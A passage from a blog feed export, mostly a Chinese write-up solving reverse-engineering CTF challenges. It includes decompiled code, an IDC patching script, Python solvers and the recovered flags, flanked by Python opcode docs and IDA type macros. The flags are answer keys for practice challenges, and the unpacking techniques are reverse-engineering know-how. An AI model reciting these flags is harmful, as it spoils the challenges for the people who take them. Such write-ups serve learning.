containing additional positional arguments. Below that are keyword arguments (if any), positional arguments (if any) and a callable object, identically to <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION"><code>CALL_FUNCTION</code></a>. Before the callable object is called, the iterable object is “unpacked” and its contents are appended to the positional arguments passed in. The iterable object is ignored when computing the value of <code>argc</code>.</p></li><li><p><code>CALL_FUNCTION_KW</code>(<em>argc</em>)</p><p>Calls a callable object, similarly to <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION"><code>CALL_FUNCTION</code></a>. <em>argc</em> represents the number of keyword and positional arguments, identically to <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION"><code>CALL_FUNCTION</code></a>. The top of the stack contains a mapping object containing additional keyword arguments. Below that are keyword arguments (if any), positional arguments (if any) and a callable object, identically to <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION"><code>CALL_FUNCTION</code></a>. Before the callable is called, the mapping object at the top of the stack is “unpacked” and its contents are appended to the keyword arguments passed in. The mapping object at the top of the stack is ignored when computing the value of <code>argc</code>.</p></li><li><p><code>CALL_FUNCTION_VAR_KW</code>(<em>argc</em>)</p><p>Calls a callable object, similarly to <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION_VAR"><code>CALL_FUNCTION_VAR</code></a> and <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION_KW"><code>CALL_FUNCTION_KW</code></a>. <em>argc</em> represents the number of keyword and positional arguments, identically to <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION"><code>CALL_FUNCTION</code></a>. The top of the stack contains a mapping object, as per <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION_KW"><code>CALL_FUNCTION_KW</code></a>. Below that is an iterable object, as per <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION_VAR"><code>CALL_FUNCTION_VAR</code></a>. Below that are keyword arguments (if any), positional arguments (if any) and a callable object, identically to <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION"><code>CALL_FUNCTION</code></a>. Before the callable is called, the mapping object and iterable object are each “unpacked” and their contents passed in as keyword and positional arguments respectively, identically to <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION_VAR"><code>CALL_FUNCTION_VAR</code></a> and <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION_KW"><code>CALL_FUNCTION_KW</code></a>. The mapping object and iterable object are both ignored when computing the value of <code>argc</code>.</p></li><li><p><code>HAVE_ARGUMENT</code>()</p><p>This is not really an opcode. It identifies the dividing line between opcodes which don’t take arguments <code>&lt; HAVE_ARGUMENT</code> and those which do <code>&gt;= HAVE_ARGUMENT</code>.</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 查表 </tag>
            
            <tag> python </tag>
            
            <tag> opcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-re部分题解（五）</title>
      <link href="/2020/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%BA%94%EF%BC%89/"/>
      <url>/2020/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%BA%94%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>后面的题目也越来越难了，比较难比较复杂的题目会单拉出来写，这里就记录一些比较简单的题目。</p><span id="more"></span><h4 id="easy-Maze"><a href="#easy-Maze" class="headerlink" title="easy_Maze"></a>easy_Maze</h4><p>看名字就知道是个迷宫题，IDA打开看看</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp)&#123;  __int64 v3; // rax  int v5[7]; // [rsp+0h] [rbp-270h]  int v6; // [rsp+C0h] [rbp-1B0h]  int v7[7]; // [rsp+D0h] [rbp-1A0h]  int v8; // [rsp+190h] [rbp-E0h]  int v9[7]; // [rsp+1A0h] [rbp-D0h]  int v10; // [rsp+1BCh] [rbp-B4h]  int v11; // [rsp+1C0h] [rbp-B0h]  int v12; // [rsp+1C4h] [rbp-ACh]  int v13; // [rsp+1C8h] [rbp-A8h]  int v14; // [rsp+1CCh] [rbp-A4h]  int v15; // [rsp+1D0h] [rbp-A0h]  int v16; // [rsp+1D4h] [rbp-9Ch]  int v17; // [rsp+1D8h] [rbp-98h]  int v18; // [rsp+1DCh] [rbp-94h]  int v19; // [rsp+1E0h] [rbp-90h]  int v20; // [rsp+1E4h] [rbp-8Ch]  int v21; // [rsp+1E8h] [rbp-88h]  int v22; // [rsp+1ECh] [rbp-84h]  int v23; // [rsp+1F0h] [rbp-80h]  int v24; // [rsp+1F4h] [rbp-7Ch]  int v25; // [rsp+1F8h] [rbp-78h]  int v26; // [rsp+1FCh] [rbp-74h]  int v27; // [rsp+200h] [rbp-70h]  int v28; // [rsp+204h] [rbp-6Ch]  int v29; // [rsp+208h] [rbp-68h]  int v30; // [rsp+20Ch] [rbp-64h]  int v31; // [rsp+210h] [rbp-60h]  int v32; // [rsp+214h] [rbp-5Ch]  int v33; // [rsp+218h] [rbp-58h]  int v34; // [rsp+21Ch] [rbp-54h]  int v35; // [rsp+220h] [rbp-50h]  int v36; // [rsp+224h] [rbp-4Ch]  int v37; // [rsp+228h] [rbp-48h]  int v38; // [rsp+22Ch] [rbp-44h]  int v39; // [rsp+230h] [rbp-40h]  int v40; // [rsp+234h] [rbp-3Ch]  int v41; // [rsp+238h] [rbp-38h]  int v42; // [rsp+23Ch] [rbp-34h]  int v43; // [rsp+240h] [rbp-30h]  int v44; // [rsp+244h] [rbp-2Ch]  int v45; // [rsp+248h] [rbp-28h]  int v46; // [rsp+24Ch] [rbp-24h]  int v47; // [rsp+250h] [rbp-20h]  int v48; // [rsp+254h] [rbp-1Ch]  int v49; // [rsp+258h] [rbp-18h]  int v50; // [rsp+25Ch] [rbp-14h]  int v51; // [rsp+260h] [rbp-10h]  v9[0] = 1;  v9[1] = 1;  v9[2] = -1;  v9[3] = 1;  v9[4] = -1;  v9[5] = 1;  v9[6] = -1;  v10 = 0;  v11 = 0;  v12 = 0;  v13 = 0;  v14 = 1;  v15 = -1;  v16 = 0;  v17 = 0;  v18 = 1;  v19 = 0;  v20 = 0;  v21 = 1;  v22 = 0;  v23 = -1;  v24 = -1;  v25 = 0;  v26 = 1;  v27 = 0;  v28 = 1;  v29 = -1;  v30 = 0;  v31 = -1;  v32 = 0;  v33 = 0;  v34 = 0;  v35 = 0;  v36 = 0;  v37 = 1;  v38 = -1;  v39 = -1;  v40 = 1;  v41 = -1;  v42 = 0;  v43 = -1;  v44 = 2;  v45 = 1;  v46 = -1;  v47 = 0;  v48 = 0;  v49 = -1;  v50 = 1;  v51 = 0;  memset(v7, 0, 0xC0uLL);  v8 = 0;  memset(v5, 0, 0xC0uLL);  v6 = 0;  Step_0((int (*)[7])v9, 7, (int (*)[7])v7);  Step_1((int (*)[7])v7, 7, (int (*)[7])v5);  v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;_bss_start, &quot;Please help me out!&quot;);  std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  Step_2((int (*)[7])v5, 7);  system(&quot;pause&quot;);  return 0;&#125;</code></pre><p>首先新建了三个地图，初始化了其中一个，然后利用下面两步分别初始化另外两个图</p><pre><code class="c++">Step_0((int (*)[7])v9, 7, (int (*)[7])v7);Step_1((int (*)[7])v7, 7, (int (*)[7])v5);</code></pre><p>具体的操作在<code>Step_2((int (*)[7])v5, 7)</code>里，可以看到只用了最后的一个图，可以直接动态调试<code>dump</code>出地图来，然后看一下具体操作</p><pre><code class="c++">__int64 __fastcall Step_2(int (*a1)[7])&#123;  int v1; // eax  __int64 v2; // rax  __int64 v3; // rax  __int64 result; // rax  __int64 v5; // rax  char v6[35]; // [rsp+10h] [rbp-30h]  char v7; // [rsp+33h] [rbp-Dh]  int v8; // [rsp+34h] [rbp-Ch]  int v9; // [rsp+38h] [rbp-8h]  int v10; // [rsp+3Ch] [rbp-4h]  v10 = 0;  v9 = 0;  v8 = 0;  while ( v8 &lt;= 29 &amp;&amp; (*a1)[7 * v10 + v9] == 1 )  &#123;    std::operator&gt;&gt;&lt;char,std::char_traits&lt;char&gt;&gt;(&amp;std::cin, &amp;v7);    v1 = v8++;    v6[v1] = v7;    if ( v7 == 100 )    &#123;      ++v9;    &#125;    else if ( v7 &gt; 100 )    &#123;      if ( v7 == 115 )      &#123;        ++v10;      &#125;      else      &#123;        if ( v7 != 119 )          goto LABEL_14;        --v10;      &#125;    &#125;    else if ( v7 == 97 )    &#123;      --v9;    &#125;    else    &#123;LABEL_14:      v2 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;_bss_start, &quot;include illegal words.&quot;);      std::ostream::operator&lt;&lt;(v2, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    &#125;  &#125;  if ( v10 != 6 || v9 != 6 )  &#123;    v5 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;_bss_start, &quot;Oh no!,Please try again~~&quot;);    std::ostream::operator&lt;&lt;(v5, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    result = 0LL;  &#125;  else  &#123;    v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;_bss_start, &quot;Congratulations!&quot;);    std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    output(v6, v8);    result = 1LL;  &#125;  return result;&#125;</code></pre><p>难度不是很大，经典的<code>wasd</code>，只能经过1的位置，走到最后就可以了，整个路径的操作就是flag，格式为<code>UNCTF&#123;&#125;</code></p><p><code>dump</code>出的地图为</p><pre><code>1 0 0 1 1 1 11 0 1 1 0 0 11 1 1 0 1 1 10 0 0 1 1 0 01 1 1 1 0 0 01 0 0 0 1 1 11 1 1 1 1 0 1</code></pre><p>走出来就可以了</p><pre><code>ssddwdwdddssaasasaaassddddwdds</code></pre><p>验证一下</p><pre><code class="bash">root@rycbar17th:~# ./easy_Maze Please help me out!ssddwdwdddssaasasaaassddddwddsCongratulations!Thanks! Give you a flag: UNCTF&#123;ssddwdwdddssaasasaaassddddwdds&#125;sh: 1: pause: not found</code></pre><p>得到flag</p><pre><code>UNCTF&#123;ssddwdwdddssaasasaaassddddwdds&#125;</code></pre><h4 id="ReverseMe-120"><a href="#ReverseMe-120" class="headerlink" title="ReverseMe-120"></a>ReverseMe-120</h4><p>将输入的字符串进行base64加密然后异或，和明文字符串进行对比</p><pre><code class="c++">if ( v18 &amp;&amp; *v19 &gt;= v13 )  &#123;    v21 = 3;    v14 = 0;    for ( lengtha = 0; v5; --v5 )    &#123;      v15 = *v7;      if ( *v7 != 13 &amp;&amp; v15 != 10 &amp;&amp; v15 != 32 )      &#123;        v16 = byte_414E40[v15];        v21 -= v16 == 64;        v14 = v16 &amp; 0x3F | (v14 &lt;&lt; 6);        if ( ++lengtha == 4 )        &#123;          lengtha = 0;          if ( v21 )            *v12++ = BYTE2(v14);          if ( v21 &gt; 1 )            *v12++ = BYTE1(v14);          if ( v21 &gt; 2 )            *v12++ = v14;        &#125;      &#125;      ++v7;    &#125;</code></pre><p>有很多的无用代码，这里是关键代码，可以看到每四个字节进行了拼接，输出为三个字节，很显然是base64。</p><h4 id="Replace"><a href="#Replace" class="headerlink" title="Replace"></a>Replace</h4><p>湖湘杯2018的题目，当时还参加过，那时候连这道题都毫无头绪<del>(真的菜</del></p><p>这就是个简单的换表题，先upx脱个壳</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp)&#123;  int v3; // kr00_4  char Buf; // [esp+4h] [ebp-2Ch]  char Dst; // [esp+5h] [ebp-2Bh]  Buf = 0;  memset(&amp;Dst, 0, 0x27u);  printf(&quot;Welcome The System\nPlease Input Key:&quot;);  gets_s(&amp;Buf, 0x28u);  v3 = strlen(&amp;Buf);  if ( (unsigned int)(v3 - 35) &lt;= 2 )  &#123;    if ( sub_401090((int)&amp;Buf, v3) == 1 )      printf(&quot;Well Done!\n&quot;);    else      printf(&quot;Your Wrong!\n&quot;);  &#125;  return 0;&#125;signed int __fastcall sub_401090(int input, int length)&#123;  int _input; // ebx  int index; // edx  char tmp_char; // al  int v6; // esi  int v7; // edi  char v8; // al  int v9; // eax  char v10; // cl  int v11; // eax  int v12; // ecx  _input = input;  if ( length != 35 )    return -1;  index = 0;  while ( 1 )  &#123;    tmp_char = *(_BYTE *)(index + _input);    v6 = (tmp_char &gt;&gt; 4) % 16;    v7 = (16 * tmp_char &gt;&gt; 4) % 16;    v8 = byte_402150[2 * index];    if ( v8 &lt; &#39;0&#39; || v8 &gt; &#39;9&#39; )      v9 = v8 - &#39;W&#39;;    else      v9 = v8 - &#39;0&#39;;    v10 = byte_402151[2 * index];    v11 = 16 * v9;    if ( v10 &lt; &#39;0&#39; || v10 &gt; &#39;9&#39; )      v12 = v10 - &#39;W&#39;;    else      v12 = v10 - &#39;0&#39;;    if ( (unsigned __int8)byte_4021A0[16 * v6 + v7] != ((v11 + v12) ^ 0x19) )      break;    if ( ++index &gt;= 35 )      return 1;  &#125;  return -1;&#125;</code></pre><p>处理了半天，高四位低四位的处理来处理去，最后还要合在一起……</p><pre><code class="python">target = [    0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01,    0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D,    0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4,    0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC,    0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7,    0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2,    0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E,    0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,    0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB,    0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB,    0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C,    0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5,    0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C,    0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D,    0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A,    0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,    0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3,    0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D,    0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A,    0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6,    0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E,    0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9,    0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9,    0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,    0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99,    0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16]var = [0x2a, 0x49, 0xf6, 0x9c, 0x38, 0x39, 0x5c, 0xde, 0x96, 0xd6, 0xde, 0x96, 0xd6, 0xf4, 0xe0, 0x25, 0x48, 0x49,       0x54, 0xd6, 0x19, 0x54, 0x48, 0xde, 0xf6, 0xe2, 0xda, 0xd6, 0x77, 0x86, 0xe2, 0x1d, 0x5a, 0xda, 0xe6]flag = &#39;&#39;for i in var:    tmp = target.index(i^0x19)    flag += chr(tmp)print(flag)</code></pre><p>输出flag</p><pre><code>flag&#123;Th1s_1s_Simple_Rep1ac3_Enc0d3&#125;</code></pre><h4 id="babyRE"><a href="#babyRE" class="headerlink" title="babyRE"></a>babyRE</h4><p>又是一道SMC，不知道为什么最近遇到的还是挺多的</p><p>没有任何加密，IDA打开</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp)&#123;  char s; // [rsp+0h] [rbp-20h]  int v5; // [rsp+18h] [rbp-8h]  int i; // [rsp+1Ch] [rbp-4h]  for ( i = 0; i &lt;= 181; ++i )  &#123;    envp = (const char **)(*((unsigned __int8 *)judge + i) ^ 0xCu);    *((_BYTE *)judge + i) ^= 0xCu;  &#125;  printf(&quot;Please input flag:&quot;, argv, envp);  __isoc99_scanf(&quot;%20s&quot;, &amp;s);  v5 = strlen(&amp;s);  if ( v5 == 14 &amp;&amp; (unsigned int)judge((__int64)&amp;s) )    puts(&quot;Right!&quot;);  else    puts(&quot;Wrong!&quot;);  return 0;&#125;</code></pre><p>经典的输入然后验证，不过<code>judge</code>函数是打不开的，看前面的操作，典型的SMC，写个IDC脚本跑一下</p><pre><code class="c++">#include &lt;idc.idc&gt;static main() &#123;    auto judge, addr,tmp;    judge = 0x600B00;    auto i;    for ( i = 0; i &lt;= 181; ++i )    &#123;        addr=judge+i;        tmp=Byte(addr);        tmp=tmp^ 0xC;        PatchByte(addr,tmp);    &#125;    Message(&quot;Down!&quot;);&#125;</code></pre><p>然后改一下<code>judge</code>函数的结束位置，<code>F5</code>分析，逻辑很好懂</p><pre><code class="c++">signed __int64 __fastcall judge(__int64 a1)&#123;  __int64 v2; // [rsp-8h] [rbp-8h]  *(&amp;v2 - 5) = a1;  *((_BYTE *)&amp;v2 - 32) = 0x66;  *((_BYTE *)&amp;v2 - 31) = 0x6D;  *((_BYTE *)&amp;v2 - 30) = 0x63;  *((_BYTE *)&amp;v2 - 29) = 0x64;  *((_BYTE *)&amp;v2 - 28) = 0x7F;  *((_BYTE *)&amp;v2 - 27) = 0x6B;  *((_BYTE *)&amp;v2 - 26) = 0x37;  *((_BYTE *)&amp;v2 - 25) = 0x64;  *((_BYTE *)&amp;v2 - 24) = 0x3B;  *((_BYTE *)&amp;v2 - 23) = 0x56;  *((_BYTE *)&amp;v2 - 22) = 0x60;  *((_BYTE *)&amp;v2 - 21) = 0x3B;  *((_BYTE *)&amp;v2 - 20) = 0x6E;  *((_BYTE *)&amp;v2 - 19) = 0x70;  for ( *((_DWORD *)&amp;v2 - 1) = 0; *((_DWORD *)&amp;v2 - 1) &lt;= 13; ++*((_DWORD *)&amp;v2 - 1) )    *(_BYTE *)(*((signed int *)&amp;v2 - 1) + *(&amp;v2 - 5)) ^= *((_DWORD *)&amp;v2 - 1);  for ( *((_DWORD *)&amp;v2 - 1) = 0; *((_DWORD *)&amp;v2 - 1) &lt;= 13; ++*((_DWORD *)&amp;v2 - 1) )  &#123;    if ( *(_BYTE *)(*((signed int *)&amp;v2 - 1) + *(&amp;v2 - 5)) != *((_BYTE *)&amp;v2 + *((signed int *)&amp;v2 - 1) - 32) )      return 0LL;  &#125;  return 1LL;&#125;</code></pre><p>这里其实有三个变量，<code>&amp;v2-1</code>的位置是一个整型，实际上是索引值，<code>&amp;v2-5</code>是我们输入的字符串，<code>&amp;v2-19</code>是最终的目标，只有一个异或操作，很简单就可以跑出来结果</p><pre><code class="python">target = [0x66, 0x6D, 0x63, 0x64, 0x7F, 0x6B, 0x37, 0x64, 0x3B, 0x56, 0x60, 0x3B, 0x6E, 0x70]flag = &#39;&#39;for i in range(14):    flag += chr(target[i] ^ i)print(flag)</code></pre><p>输出flag</p><pre><code>flag&#123;n1c3_j0b&#125;</code></pre><h4 id="What-does-this-button-do"><a href="#What-does-this-button-do" class="headerlink" title="What-does-this-button-do"></a>What-does-this-button-do</h4><p>不知道为什么这题放在了这个位置，简单得不能再简单的一个mobile</p><p>jadx打开，很快就可以找到关键代码</p><pre><code class="java"> public void onCreate(Bundle savedInstanceState) &#123;        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_flag);        String flag = &quot;&quot;;        int[] d = &#123;102, 108, 97, 103, 123, 119, 52, 110, 110, 52, 95, 106, 52, 114, 95, 109, 121, 95, 100, 51, 120, 125&#125;;        for (int i = 0; i &lt; 22; i++) &#123;            flag = flag.concat(String.valueOf((char) d[i]));        &#125;        ((TextView) findViewById(R.id.flagText)).setText(flag);    &#125;</code></pre><p>然后直接输出把flag输出就可以了</p><p>不过这题要去掉外面的<code>flag&#123;&#125;</code>提交</p><pre><code>w4nn4_j4r_my_d3x</code></pre><h4 id="76号"><a href="#76号" class="headerlink" title="76号"></a>76号</h4><p>单字检测，pintools爆破，得到flag</p><p>直接<a href="https://github.com/ChrisTheCoolHut/PinCTF">滚轮子</a></p><pre><code>flag&#123;09vdf7wefijbk&#125;</code></pre><h4 id="easy-go"><a href="#easy-go" class="headerlink" title="easy_go"></a>easy_go</h4><p>这题根据名字也知道是go逆向，IDA打开是乱七八糟的函数，也没有任何的symbol，用go重命名的插件给函数重命名，发现一个base64的解码函数和奇怪的字符串，字母表不是很清楚，动态调试一下</p><pre><code class="asm">[-------------------------------------code-------------------------------------]   0x4952dd:    mov    QWORD PTR [rsp],rax   0x4952e1:    mov    QWORD PTR [rsp+0x8],rcx   0x4952e6:    mov    QWORD PTR [rsp+0x10],rdx=&gt; 0x4952eb:    call   0x47e620   0x4952f0:    mov    rax,QWORD PTR [rsp+0x38]   0x4952f5:    mov    rcx,QWORD PTR [rsp+0x30]   0x4952fa:    mov    rdx,QWORD PTR [rsp+0x18]   0x4952ff:    mov    rbx,QWORD PTR [rsp+0x20]No argument[------------------------------------stack-------------------------------------]0000| 0xc000070e90 --&gt; 0xc000074580 (&quot;6789_-abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345&quot;, &#39;\377&#39; &lt;repeats 45 times&gt;, &quot;\005\377\377:;&lt;=&gt;?&quot;)0008| 0xc000070e98 --&gt; 0xc000088040 (&quot;tGRBtXMZgD6ZhalBtCUTgWgZfnkTgqoNsnAVsmUYsGtCt9pEtDEYsql3&quot;)0016| 0xc000070ea0 --&gt; 0x38 (&#39;8&#39;)0024| 0xc000070ea8 --&gt; 0x40 (&#39;@&#39;)0032| 0xc000070eb0 --&gt; 0xc000088040 (&quot;tGRBtXMZgD6ZhalBtCUTgWgZfnkTgqoNsnAVsmUYsGtCt9pEtDEYsql3&quot;)0040| 0xc000070eb8 --&gt; 0x38 (&#39;8&#39;)0048| 0xc000070ec0 --&gt; 0x1 0056| 0xc000070ec8 --&gt; 0x1 [------------------------------------------------------------------------------]Legend: code, data, rodata, valueThread 1 &quot;easyGo&quot; hit Breakpoint 3, 0x00000000004952eb in ?? ()</code></pre><p>找到字母表和密文，解密得到flag</p><pre><code>flag&#123;92094daf-33c9-431e-a85a-8bfbd5df98ad&#125;</code></pre><h4 id="easyCpp"><a href="#easyCpp" class="headerlink" title="easyCpp"></a>easyCpp</h4><p>这题有很多c++标准库的调用，整体来说不是很难，可以通过调试发现每一部分的作用，也不是很难</p><h4 id="re5-packed-movement"><a href="#re5-packed-movement" class="headerlink" title="re5-packed-movement"></a>re5-packed-movement</h4><p>极其无聊的一道题，硬生生用<code>mov</code>实现了所有操作，要求输入<code>flag</code>对比一下，直接<code>objdump</code>就能再汇编代码里找到逐字符将flag移入到某个地址，或者因为是逐字符验证，直接<code>pintools</code>爆破也可以</p><h4 id="the-maya-society"><a href="#the-maya-society" class="headerlink" title="the_maya_society"></a>the_maya_society</h4><p>大致意思就是对当前时间进行一个<code>md5</code>加密，然后和一个字符串连接成目标网址，如果这个目标是对的后面的通信就会得到正确的flag……</p><p>时间应该是2012-12-21</p><h4 id="2ex1"><a href="#2ex1" class="headerlink" title="2ex1"></a>2ex1</h4><p><code>mips</code>，并且<code>strip</code>过，什么信息都没有，打开输出发现很像<code>base64</code>，但应该换过表，<code>ghidra</code>打开找找可疑字符串，发现奇怪的字符串</p><pre><code>@,.1fgvw#`/2ehux$~&quot;3dity%_;4cjsz^+&#123;5bkrA&amp;=&#125;6alqB*-[70mpC()]89noD</code></pre><p>试一试就得到了flag</p><pre><code>flag&#123;change53233&#125;</code></pre><p>对这个字符串表进行交叉引用查询到话也可以找到进行<code>base64</code>编码的函数</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
            <tag> 攻防世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDA常用宏定义</title>
      <link href="/2020/03/10/IDA%E5%B8%B8%E7%94%A8%E5%AE%8F%E5%AE%9A%E4%B9%89/"/>
      <url>/2020/03/10/IDA%E5%B8%B8%E7%94%A8%E5%AE%8F%E5%AE%9A%E4%B9%89/</url>
      
        <content type="html"><![CDATA[<p>保存一下便于查询。</p><span id="more"></span><pre><code class="c++">/*   This file contains definitions used by the Hex-Rays decompiler output.   It has type definitions and convenience macros to make the   output more readable.   Copyright (c) 2007-2011 Hex-Rays*/#if defined(__GNUC__)  typedef          long long ll;  typedef unsigned long long ull;  #define __int64 long long  #define __int32 int  #define __int16 short  #define __int8  char  #define MAKELL(num) num ## LL  #define FMT_64 &quot;ll&quot;#elif defined(_MSC_VER)  typedef          __int64 ll;  typedef unsigned __int64 ull;  #define MAKELL(num) num ## i64  #define FMT_64 &quot;I64&quot;#elif defined (__BORLANDC__)  typedef          __int64 ll;  typedef unsigned __int64 ull;  #define MAKELL(num) num ## i64  #define FMT_64 &quot;L&quot;#else  #error &quot;unknown compiler&quot;#endiftypedef unsigned int uint;typedef unsigned char uchar;typedef unsigned short ushort;typedef unsigned long ulong;typedef          char   int8;typedef   signed char   sint8;typedef unsigned char   uint8;typedef          short  int16;typedef   signed short  sint16;typedef unsigned short  uint16;typedef          int    int32;typedef   signed int    sint32;typedef unsigned int    uint32;typedef ll              int64;typedef ll              sint64;typedef ull             uint64;// Partially defined types:#define _BYTE  uint8#define _WORD  uint16#define _DWORD uint32#define _QWORD uint64#if !defined(_MSC_VER)#define _LONGLONG __int128#endif#ifndef _WINDOWS_typedef int8 BYTE;typedef int16 WORD;typedef int32 DWORD;typedef int32 LONG;#endiftypedef int64 QWORD;#ifndef __cplusplustypedef int bool;       // we want to use bool in our C programs#endif// Some convenience macros to make partial accesses nicer// first unsigned macros:#define LOBYTE(x)   (*((_BYTE*)&amp;(x)))   // low byte#define LOWORD(x)   (*((_WORD*)&amp;(x)))   // low word#define LODWORD(x)  (*((_DWORD*)&amp;(x)))  // low dword#define HIBYTE(x)   (*((_BYTE*)&amp;(x)+1))#define HIWORD(x)   (*((_WORD*)&amp;(x)+1))#define HIDWORD(x)  (*((_DWORD*)&amp;(x)+1))#define BYTEn(x, n)   (*((_BYTE*)&amp;(x)+n))#define WORDn(x, n)   (*((_WORD*)&amp;(x)+n))#define BYTE1(x)   BYTEn(x,  1)         // byte 1 (counting from 0)#define BYTE2(x)   BYTEn(x,  2)#define BYTE3(x)   BYTEn(x,  3)#define BYTE4(x)   BYTEn(x,  4)#define BYTE5(x)   BYTEn(x,  5)#define BYTE6(x)   BYTEn(x,  6)#define BYTE7(x)   BYTEn(x,  7)#define BYTE8(x)   BYTEn(x,  8)#define BYTE9(x)   BYTEn(x,  9)#define BYTE10(x)  BYTEn(x, 10)#define BYTE11(x)  BYTEn(x, 11)#define BYTE12(x)  BYTEn(x, 12)#define BYTE13(x)  BYTEn(x, 13)#define BYTE14(x)  BYTEn(x, 14)#define BYTE15(x)  BYTEn(x, 15)#define WORD1(x)   WORDn(x,  1)#define WORD2(x)   WORDn(x,  2)         // third word of the object, unsigned#define WORD3(x)   WORDn(x,  3)#define WORD4(x)   WORDn(x,  4)#define WORD5(x)   WORDn(x,  5)#define WORD6(x)   WORDn(x,  6)#define WORD7(x)   WORDn(x,  7)// now signed macros (the same but with sign extension)#define SLOBYTE(x)   (*((int8*)&amp;(x)))#define SLOWORD(x)   (*((int16*)&amp;(x)))#define SLODWORD(x)  (*((int32*)&amp;(x)))#define SHIBYTE(x)   (*((int8*)&amp;(x)+1))#define SHIWORD(x)   (*((int16*)&amp;(x)+1))#define SHIDWORD(x)  (*((int32*)&amp;(x)+1))#define SBYTEn(x, n)   (*((int8*)&amp;(x)+n))#define SWORDn(x, n)   (*((int16*)&amp;(x)+n))#define SBYTE1(x)   SBYTEn(x,  1)#define SBYTE2(x)   SBYTEn(x,  2)#define SBYTE3(x)   SBYTEn(x,  3)#define SBYTE4(x)   SBYTEn(x,  4)#define SBYTE5(x)   SBYTEn(x,  5)#define SBYTE6(x)   SBYTEn(x,  6)#define SBYTE7(x)   SBYTEn(x,  7)#define SBYTE8(x)   SBYTEn(x,  8)#define SBYTE9(x)   SBYTEn(x,  9)#define SBYTE10(x)  SBYTEn(x, 10)#define SBYTE11(x)  SBYTEn(x, 